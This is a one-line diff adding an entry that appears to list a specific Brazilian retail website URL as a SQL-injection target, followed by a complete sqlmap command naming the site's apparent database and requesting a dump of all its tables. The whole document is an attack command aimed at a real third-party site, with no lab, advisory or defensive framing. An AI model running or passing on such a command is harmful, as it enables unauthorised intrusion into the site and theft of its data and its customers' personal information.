@@ -1,0 +1,1 @@
+https://www.glammodagrande.com.br/?secao=novidades_detalhes&id=833 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.glammodagrande.com.br/?secao=novidades_detalhes&id=833 -D glammoda_website --tables --dump-all
